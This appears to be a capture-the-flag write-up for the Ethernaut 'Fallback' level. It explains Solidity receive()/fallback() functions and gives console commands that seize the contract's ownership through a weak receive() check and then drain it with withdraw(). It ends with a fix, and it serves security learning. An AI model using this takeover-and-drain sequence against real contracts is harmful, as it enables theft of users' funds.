# Level 1: Fallback

**Difficulty:** Easy

**Vulnerability:** Improper ownership transfer in `receive()` fallback function

---

## Background Concepts

Before solving this level, I had to learn a few key Ethereum interactions:

### Sending ETH through the ABI (calling a payable function)
When a contract function is `payable`, you send ETH as part of the call using `value`:
```js
await contract.contribute({ value: toWei("0.0001") })
```

### Sending ETH outside the ABI (plain transfer)
To send ETH directly to a contract address without calling a named function, use `sendTransaction`:
```js
await sendTransaction({ from: player, to: contract.address, value: toWei("0.001") })
```
This triggers the contract's `receive()` or `fallback()` function instead of any named function.

### Wei / Ether conversion
ETH has 18 decimal places — `1 ETH = 1,000,000,000,000,000,000 wei`. Ethernaut injects helpers:
```js
toWei("0.001")   // → "1000000000000000"
fromWei("1000000000000000000")  // → "1"
```

### Fallback functions
Solidity has two special functions that run when ETH is sent without a matching function call:

| Function | Triggered when |
|---|---|
| `receive()` | Plain ETH transfer (no calldata) |
| `fallback()` | Call with unknown function signature, or ETH + calldata |

---

## How it Works

The contract tracks contributions per address and makes anyone with more contributions than the current owner the new owner. The owner starts with 1000 ETH in contributions, so beating them through `contribute()` is impractical — each call is capped at `< 0.001 ETH`.

However, the `receive()` function has a much weaker check:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

It only requires that you've made **any** prior contribution and are sending **any** ETH. That's it — ownership transfers immediately.

---

## What I Tried First

I noticed `owner = msg.sender` inside `contribute()` and thought I could just call it with a large amount. But the `require(msg.value < 0.001 ether)` blocks that, and the owner has 1000 ETH in contributions — it would take hundreds of thousands of transactions to beat that legitimately.

---

## Exploit Steps

1. Make a small contribution to satisfy `contributions[msg.sender] > 0`:
```js
await contract.contribute({ value: toWei("0.0001") })
```

2. Send ETH directly to the contract to trigger `receive()` and claim ownership:
```js
await sendTransaction({ from: player, to: contract.address, value: toWei("0.0001") })
```

3. Confirm ownership changed:
```js
await contract.owner()  // should return your player address
```

4. Drain the contract:
```js
await contract.withdraw()
```

5. Confirm balance is zero:
```js
await getBalance(contract.address)  // → "0"
```

---

## Key Takeaway

The `receive()` function modified critical ownership state (`owner = msg.sender`) behind a weak two-condition check. Anyone who had ever contributed even a tiny amount could take over the contract by sending a plain ETH transfer.

**The fix:** never transfer ownership inside a `receive()`/`fallback()` function. Ownership changes should require stricter verification — ideally a multi-step process with a time delay, not a single transaction check. The `receive()` function should only handle ETH accounting, not authorization.

**Vulnerability category:** Access Control
